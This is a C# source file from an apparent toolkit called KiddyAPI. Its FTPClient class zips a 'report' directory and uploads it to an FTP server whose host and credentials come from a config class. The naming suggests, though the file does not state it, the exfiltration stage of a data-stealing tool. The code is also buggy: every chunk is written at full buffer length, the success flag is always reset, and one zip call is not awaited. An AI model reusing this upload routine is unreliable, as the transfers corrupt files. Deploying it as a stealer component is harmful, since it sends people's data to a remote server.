using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using KiddyAPI.Protect;

namespace KiddyAPI.Network
{
    class FTPClient
    {
        /// <summary>
        /// Upload to ur Ftp Server choosed file
        /// </summary>
        /// <param name="userName">FTPServer Username</param>
        /// <param name="password">FTPServer Password</param>
        /// <param name="hostName">FTPServer hostname</param>
        /// <param name="pathToFile">Path to file</param>
        public static async void UploadReportAsync(string userName, string password, string hostName,string pathToFile)
        {
            int bufferLenght = 2048;
            await Task.Run(() =>
            {
                var fileInfo = new FileInfo(pathToFile);
                var req = (FtpWebRequest) WebRequest.Create(new Uri($"ftp://{hostName}/{fileInfo.Name}"));
                req.Credentials = new NetworkCredential(userName,password);
                req.KeepAlive = false;
                req.Method = WebRequestMethods.Ftp.UploadFile;
                req.UseBinary = true;
                req.ContentLength = fileInfo.Length;
                var buffer = new byte[bufferLenght];
                int contentLenght;
                using (FileStream fs = fileInfo.OpenRead())
                {
                    try
                    {
                        Stream str = req.GetRequestStream();
                        contentLenght = fs.Read(buffer, 0, bufferLenght);
                        while (contentLenght != 0)
                        {
                            str.Write(buffer,0,bufferLenght);
                            contentLenght = fs.Read(buffer, 0, bufferLenght);
                        }
                        str.Close();
                        Config.UploadSuccess = true;
                    }
                    catch (Exception e) // Delete this if u not debuging
                    {
                        Console.WriteLine(e);
                        throw;
                    }
                }
            });
            Config.UploadSuccess = false;
        }
        /// <summary>
        /// Upload report data if given credentials in Config Class
        /// </summary>
        /// <param name="pathToDataDirectory">Path to Report Directory</param>
        public static async void UploadReportAsync(string pathToDataDirectory)
        {
            int bufferLenght = 2048;
            await Task.Run(() =>
            {
                string pathToZipData = pathToDataDirectory + ".zip";
                Utils.ToZipAsync(pathToDataDirectory, pathToZipData);
                var fileInfo = new FileInfo(pathToZipData);
                var req = (FtpWebRequest)WebRequest.Create(new Uri($"ftp://{Config.FTPHostName}/{fileInfo.Name}"));
                req.Credentials = new NetworkCredential(Config.FTPUserName, Config.FTPPassword);
                req.KeepAlive = false;
                req.Method = WebRequestMethods.Ftp.UploadFile;
                req.UseBinary = true;
                req.ContentLength = fileInfo.Length;
                var buffer = new byte[bufferLenght];
                int contentLenght;
                using (FileStream fs = fileInfo.OpenRead())
                {
                    try
                    {
                        Stream str = req.GetRequestStream();
                        contentLenght = fs.Read(buffer, 0, bufferLenght);
                        while (contentLenght != 0)
                        {
                            str.Write(buffer, 0, bufferLenght);
                            contentLenght = fs.Read(buffer, 0, bufferLenght);
                        }
                        str.Close();
                        Config.UploadSuccess = true;
                    }
                    catch (Exception e) // Delete this if u not debuging
                    {
                        Console.WriteLine(e);
                        throw;
                    }
                }
            });
            Config.UploadSuccess = false;
        }
        /// <summary>
        /// Upload report if u filled all data in Config Class
        /// </summary>
        public static async void UploadReportAsync()
        {
            int bufferLenght = 2048;
            await Task.Run(() =>
            {
                string pathToZipDataReport = Config.PathToReportDataDirectory + ".zip";
                ZipFile.CreateFromDirectory(Config.PathToReportDataDirectory, pathToZipDataReport);
                var fileInfo = new FileInfo(pathToZipDataReport);
                var req = (FtpWebRequest)WebRequest.Create(new Uri($"ftp://{Config.FTPHostName}/{fileInfo.Name}"));
                req.Credentials = new NetworkCredential(Config.FTPUserName, Config.FTPPassword);
                req.KeepAlive = false;
                req.Method = WebRequestMethods.Ftp.UploadFile;
                req.UseBinary = true;
                req.ContentLength = fileInfo.Length;
                var buffer = new byte[bufferLenght];
                int contentLenght;
                using (FileStream fs = fileInfo.OpenRead())
                {
                    try
                    {
                        Stream str = req.GetRequestStream();
                        contentLenght = fs.Read(buffer, 0, bufferLenght);
                        while (contentLenght != 0)
                        {
                            str.Write(buffer, 0, bufferLenght);
                            contentLenght = fs.Read(buffer, 0, bufferLenght);
                        }
                        str.Close();
                        Config.UploadSuccess = true;
                    }
                    catch (Exception e) // Delete this if u not debuging
                    {
                        Console.WriteLine(e);
                        throw;
                    }
                }
            });
            Config.UploadSuccess = false;
        }
    }
}
